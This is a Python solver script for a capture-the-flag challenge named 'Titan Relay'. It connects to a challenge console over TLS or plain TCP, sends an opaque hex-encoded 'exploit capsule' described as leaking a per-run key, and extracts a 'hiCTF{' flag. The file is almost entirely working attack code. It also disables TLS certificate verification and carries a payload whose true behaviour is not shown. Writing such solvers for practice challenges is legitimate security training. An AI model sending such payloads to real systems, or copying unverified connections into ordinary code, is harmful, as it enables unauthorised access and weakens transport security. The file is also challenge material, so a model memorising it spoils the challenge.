#!/usr/bin/env python3
# Titan Relay solver — connects to the relay console and recovers the flag.
#
# Transport: some instances wrap the console in TLS, others expose it as raw
# TCP. By default we auto-detect: try a TLS handshake first, and if that fails
# fall back to a plain socket. Force one with --tls / --no-tls.
#
# Usage:
#   python3 solve_titan.py [host] [port] [--tls|--no-tls]
import socket, ssl, sys

args = [a for a in sys.argv[1:] if not a.startswith("--")]
flags = {a for a in sys.argv[1:] if a.startswith("--")}

HOST = args[0] if len(args) > 0 else "titan-relay-e0c86e95a24b.chall.hiddeninvestigations.net"
PORT = int(args[1]) if len(args) > 1 else 1337

if "--tls" in flags:
    MODES = ["tls"]
elif "--no-tls" in flags:
    MODES = ["plain"]
else:
    MODES = ["tls", "plain"]  # auto-detect

# Self-contained exploit capsule (hex). It leaks the per-run key at runtime,
# so the same bytes work on every connection.
CAP = "50aeeb2814a3df1c2894d3117f8b31fb414cb90eca73beefe97ea3a02f59602b115f8fc905427f8efdc18cb1fc293d9ebd78199bd4204c88c9065283d19b505af3ed295aa6e61f5d88d56728f9ca4547808cf83d75b2dd2d61a6e3125f92d715e08dcbab402240583a7381f3246aa755245d19dd35608ac5094732c5ff7872b5c32b61a8e5335c97d91653a2ce00478565fb3a4ab0f92f6c18e023c39a1ae8f097c95a"
LEN = len(CAP) // 2


def pump(sock, t):
    sock.settimeout(t)
    out = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            out += d
    except Exception:
        pass
    return out


def run(mode):
    s = socket.create_connection((HOST, PORT), timeout=30)
    if mode == "tls":
        ctx = ssl._create_unverified_context()
        conn = ctx.wrap_socket(s, server_hostname=HOST)
    else:
        conn = s
    banner = pump(conn, 4)
    conn.sendall(f"1\n{LEN}\n{CAP}\n2\n".encode())
    out = banner + pump(conn, 8)
    try:
        conn.close()
    except Exception:
        pass
    return out.decode("latin1")


def main():
    text = ""
    for mode in MODES:
        try:
            sys.stderr.write(f"[*] connecting to {HOST}:{PORT} ({mode})\n")
            text = run(mode)
            if text.strip():
                break
        except (ssl.SSLError, ConnectionError, OSError) as e:
            sys.stderr.write(f"[!] {mode} failed: {e}\n")
            continue
    sys.stdout.write(text)
    for line in text.splitlines():
        if "hiCTF{" in line:
            print("\n[*] FLAG:", line.strip())
            return 0
    print("\n[!] no flag in output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
